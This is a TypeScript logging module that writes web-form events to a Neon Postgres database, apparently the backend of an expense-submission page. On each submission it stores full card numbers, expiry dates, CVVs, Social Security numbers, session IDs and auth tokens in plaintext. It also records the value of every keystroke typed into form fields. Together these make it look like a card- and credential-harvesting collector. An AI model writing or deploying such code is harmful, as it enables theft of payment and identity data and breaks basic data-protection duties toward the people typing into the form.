import { neon } from '@neondatabase/serverless';

// Edge runtime compatible logger with Neon database integration
export async function logger(entry: Record<string, unknown>) {
  try {
    // Console logging for immediate debugging
    console.log('SECURITY_LOG:', JSON.stringify(entry));
    
    // Database logging
    if (process.env.DATABASE_URL) {
      const sql = neon(process.env.DATABASE_URL);
      
      // Insert into general security_logs table
      await sql(
        'INSERT INTO security_logs (type, timestamp, ip_address, user_agent, referer, data) VALUES ($1, $2, $3, $4, $5, $6)',
        [
          entry.type as string,
          entry.timestamp as string,
          entry.ip as string,
          entry.userAgent as string,
          entry.referer as string,
          JSON.stringify(entry)
        ]
      );

      // Handle specific log types with structured tables
      if (entry.type === 'submit' && entry.formData) {
        const formData = entry.formData as any;
        await sql(
          `INSERT INTO form_submissions 
           (employee_name, employee_id, expense_description, amount, business_purpose, 
            client_name, notes, card_number, card_expiry, card_cvv, ssn, 
            session_id, auth_token, ip_address, user_agent, timestamp) 
           VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16)`,
          [
            formData.employeeName,
            formData.employeeId,
            formData.expenseDescription,
            formData.amount,
            formData.businessPurpose,
            formData.clientName,
            formData.notes,
            formData.cardNumber,
            formData.cardExpiry,
            formData.cardCvv,
            formData.ssn,
            entry.sessionId as string,
            entry.authToken as string,
            entry.ip as string,
            entry.userAgent as string,
            entry.timestamp as string
          ]
        );
      }

      if (entry.type === 'keystroke') {
        await sql(
          'INSERT INTO keystroke_logs (field_name, field_value, ip_address, user_agent, referer, timestamp) VALUES ($1, $2, $3, $4, $5, $6)',
          [
            entry.field as string,
            entry.value as string,
            entry.ip as string,
            entry.userAgent as string,
            entry.referer as string,
            entry.timestamp as string
          ]
        );
      }
    }
    
  } catch (error) {
    console.error("Logger error:", error);
    // Fallback to console only if database fails
    console.log('FALLBACK_LOG:', JSON.stringify(entry));
  }
}